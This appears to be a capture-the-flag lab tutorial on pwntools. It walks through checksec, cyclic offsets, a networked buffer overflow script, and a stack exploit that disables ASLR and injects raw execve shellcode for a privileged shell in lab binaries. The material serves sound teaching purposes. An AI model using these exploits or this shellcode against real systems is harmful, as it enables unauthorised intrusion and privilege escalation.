# __Intro to Pwntools__

## __Checksec tool__

```bash
checksec <binary>
```

![checksec](https://user-images.githubusercontent.com/88755387/132090425-5380472b-af68-42d0-aa48-70ad38419bf7.png)

As you can see, these binaries both have the same architecture (i386-32-little), but differ in qualities such as RELRO, Stack canaries , NX, PIE, and RWX. Now, what are these qualities?
### __Qualities__

- __RELRO__ stands for Relocation Read-Only, which makes the global offset table (GOT) read-only after the linker resolves functions to it. The GOT is important for techniques such as the ret-to-libc attack.

    https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro

- __Stack canaries__ are tokens placed after a stack to detect a stack overflow. These were supposedly named after birds that coal miners brought down to mines to detect noxious fumes. Canaries were sensitive to the fumes, and so if they died, then the miners knew they needed to evacuate. On a less morbid note, stack canaries sit beside the stack in memory (where the program variables are stored), and if there is a stack overflow, then the canary will be corrupted. This allows the program to detect a buffer overflow and shut down.

    https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/

- __NX__ is short for non-executable. If this is enabled, then memory segments can be either writable or executable, but not both. This stops potential attackers from injecting their own malicious code (called shellcode) into the program, because something in a writable segment cannot be executed.  On the vulnerable binary, you may have noticed the extra line __RWX__ that indicates that there are segments which can be read, written, and executed.

    https://en.wikipedia.org/wiki/Executable_space_protection

- __PIE__  stands for Position Independent Executable. This loads the program dependencies into random locations, so attacks that rely on memory layout are more difficult to conduct.

    https://access.redhat.com/blogs/766093/posts/1975793

## __Cyclic__

This program is vulnerable to a buffer overflow, because it uses the gets() function, which does not check to see if the user input is actually in bounds.

https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1049157810&id=1043284351

An important part of the memory we can overwrite is the instruction pointer (IP), which is called the eip on 32-bit machines, and rip on 64-bit machines. The IP points to the next instruction to be executed, so if we redirect the eip in our binary to the print_flag() function, we can print the flag.

### __Cyclic tool__

To control the IP, the first thing we need do is to is overflow the stack with a pattern, so we can see where the IP is. I have provided the alphabet file as a pattern. Let's fire up gdb!

```bash
gdb intro2pwn3
```

To run a program in gdb, type `r`. You will see the program function normally. If you want to add an input from a text file, you use the "<" key, as such:

```bash
r < alphabet
```

We've caused a segmentation fault, and you may observe that there is an invalid address at 0x4a4a4a4a. If you scroll up, you can see the values at each register. For eip, it has been overwritten with 0x4a4a4a4a.

#### __Patterns__

```bash
cyclic 100 # This will print out a pattern of 100 characters
```
If you have used pattern_create from the Metasploit Framework, this is works in a similar way. We can create a pattern file like this:

```bash
cyclic 100 > pattern
```

and then run the pattern file as input in gdb like we did with the alphabet file.

## __Pwning to the flag__

```python
#!/usr/bin/python

from pwn import * # pwntools module

padding = cyclic(100)
```

Our padding is the space we need to get to the eip, so 100 is not the number we need. We need our padding to stop right before 'jaaa' so that we can fill in the eip with our own input. Luckily, there is a function in pwntools called cyclic_find(), which will find this automatically. Please replace the 100 with cyclic_find('jaaa'):

```python
#!/usr/bin/python

from pwn import * # pwntools module

padding = cyclic(cyclic_find('jaaa'))
```

What do we fill the eip with? For now, to make sure we have the padding correct, we should fill it with a dummy value, like 0xdeadbeef. We cannot, of course, simply write "0xdeadbeef" as a string, because the computer would interpret it as ascii, and we need it as raw hex. 

Pwntools offers an easy way to do this, with the p32() function (and p64 for 64-bit programs). This is similar to the struct.pack() function.

```python
#!/usr/bin/python

from pwn import * # pwntools module

padding = cyclic(cyclic_find('jaaa'))
eip = p32(0xdeadbeef)

payload = padding + eip
print(payload)
```

```
python p.py > attack
```

Run this new text file as input to intro2pwn3 in gdb, and make sure that you get an invalid address at 0xdeadbeef.

```
EIP  0xdeadbeef
```

The last thing we need to do is find the location of the print_flag() function. To find the print_flag() funtion, type this command into gdb:

```
print& print_flag
```

![print_flag](https://user-images.githubusercontent.com/88755387/132096351-032db5fa-2a2a-4885-b91d-ab42c57b756c.png)

Replace the 0xdeadbeef in your code with the location of the print_flag function. Once, again, we can run:

```
python p.py > attack
```

Input the attack file into the intro2pwn3 binary in the command line (because gdb will not use the suid permissions), like this:

```
./intro2pwn3 < attack
```

## __Networking__

### __Unpacking the code__

For this challenge, we do not need to concern ourselves with main(), but only the target_function(). The struct at the beginning of the function, called targets, has two variables: buff and printflag. The buff is a char array of size MAX (MAX was defined to 32), and the printflag is a volatile int. These variables will be right next to each other in the stack, so if we manage to overflow the buff variable, then we can edit the printflag. If you see further down in the code, if the printflag variable is equal to 0xdeadbeef (in hex) then it will send the flag.

### __Networking to the flag__

We will need to write a script to connect to the port, receive the data, and send our payload. To connect to a port in Pwntools, use the remote() function in the format of: remote(IP, port). 

```python
from pwn import *

connect = remote('127.0.0.1', 1336)
```

We can receive data with either the recvn(bytes) or recvline() functions. The recvn() receives as many bytes as specified, while the recvline() will receive data until there is a newline. Our code does not send a newline, so we will have to use recvn(). In our test_networking.c code, the "Give me deadbeef: " is 18 bytes, so we will receive 18 bytes.

```python
print(connect.recvn(18))
```

We have to send enough data to overflow the buff variable, and write to the printflag. The buff is a 32 byte array, so we can write some character 32 times to overflow buff, and then write our 0xdeadbeef to printflag.

```python
payload = "A"*32
payload += p32(0xdeadbeef)
```

We can send the payload with the send() function.

```python
connect.send(payload)
```

To receive our flag, We can just use connect.recvn() again. According to the c code, the flag will be 34 bytes long.

```python
print(connect.recvn(34))
```

#### __Final code__

```python
from pwn import *

connect = remote('127.0.0.1', 1336)

print(connect.recvn(18))

payload = "A"*32
payload += p32(0xdeadbeef)

connect.send(payload)

print(connect.recvn(34))
```

```
python exploit.py
```

## __Shellcraft__

Disable ASLR:

```
echo 0 | tee /proc/sys/kernel/randomize_va_space
```

### __Shell in the Haystack:__

Our variables are stored in memory, just like the program itself, so if we write instructions in our variable, and direct the eip to it, we can make the program follow our own instructions! This injected code is called shellcode, because it is traditionally (but not always) used to spawn a shell. If you recall, our variables are stored in the stack, so if we direct the eip to the stack, we will direct it to our shellcode.

Let's get control of that eip! Please find the location of the eip, like we did in the cyclic task. I would recommend filling the eip with 0xdeadbeef like we did before.

```python
from pwn import * # pwntools module

padding = cyclic(cyclic_find('taaa'))
eip = p32(0xdeadbeef)

payload = padding + eip
print(payload)
```

Once we control the EIP, we need to direct it to the stack where we can place our own code. The top of the stack is pointed to by the SP (or Stack Pointer) which is called ESP in 32-bit machines. For me, the ESP is located at `0xffffd510`, and you can check the location of yours in gdb. If we want to jump to our shellcode, we want to jump to the middle of the stack (rather than the top where the SP points), so we usually add an offset to the ESP location in your exploit. I use an offset of 200, because that's what ended up working for me. In other challenges, you may only need an offset of 8 or 16. I have found that choosing the right offset is a matter of trial and error.

```python
from pwn import * # pwntools module

padding = cyclic(cyclic_find('taaa'))
eip = p32(0xffffd510+200)

payload = padding + eip
print(payload)
```

You may be wondering how we are going to point the EIP to our shellcode (rather than other data in the stack), and the answer is to make our variable into a big landing spot. There is an instruction in assembly called no-operation (or NOP), which is 0x90 in hex, and the NOP is a space holder that passes the EIP to the next space in memory. If we make a giant "landing pad" of NOPs, and direct the EIP towards the middle of the stack, odds are that the eip will land on our NOP pad, and the NOPs will pass the EIP down to eventually hit our shellcode. This is often called a NOP slide (or sled), because the EIP will land in the NOPs and slide down to the shellcode. In my case, a NOP sled of 1000 worked, but other challenges may require different sizes. When writing a raw hex byte in python, we use the format "\x00", so we can write "\x90" for a NOP.

```python
nop_slide = "\x90"*1000
```

Before we write our shellcode, we can inject a breakpoint at the end of our NOP slide to make sure the slide works. The breakpoint instruction in hex is "0xcc", and so we can add the following to our code:

```python
shellcode = "\xcc"
```

Our payload should be as follows:

```python
payload = padding + eip + nop_slide + shellcode
```

#### __First code__

```python
from pwn import * # pwntools module

padding = cyclic(cyclic_find('taaa'))
eip = p32(0xffffd510+200)

nop_slide = "\x90"*1000
shellcode = "\xcc"

payload = padding + eip + nop_slide + shellcode
print(payload)
```

Great, we can inject our own code into the program! Of course, we want to do more than hit a breakpoint, we want to spawn a root shell. That means we need to write some shellcode. While some crazy people like to write shellcode from scratch, pwntools gives us a great utility to cook up shellcode: shellcraft. If you have ever used msfvenom, shellcraft is a similar tool. Like cyclic, shellcraft can be used in the command line and inside python code.

The command line command for shellcraft is: `shellcraft arch.OS.command`.

```bash
shellcraft i386.linux.sh -f a # get the command "execve"
```

In this case, we want to execute /bin///sh, but we want to pass 'sh' and '-p' into the argv array. We can use shellcraft to create execve shellcode with"/bin///sh" and "['sh', '-p']" as parameters. We can do this with the following command:

```
shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f a
```

When we run this command, we see it is the same as the linux.sh shellcode, except the added '-p' to the argv array. To write shellcode that is easier to use in our python exploit script, we can replace the "-f a" with "-f s", which will print our shellcode in string format.

```
shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f s
```

For a local process, we use the process() function.

```
proc = process('./intro2pwnFinal')
```

We can receive data from the process, and since the process sends data with a new line, we can use recvline(), rather than recvn().

```
proc.recvline()
```

After we have crafted our payload, we can send it with:

```
proc.send(payload)
```

Finally, after we have sent the payload, we need a way to communicate with the shell we have just spawned.

```
proc.interactive()
```

#### __Final code__

```python
from pwn import *

proc = process('./intro2pwnFinal')
proc.recvline()

padding = cyclic(cyclic_find('taaa'))
eip = p32(0xffffd510+200)

nop_slide = "\x90"*1000
shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"

payload = padding + eip + nop_slide + shellcode

proc.send(payload)
proc.interactive()
```







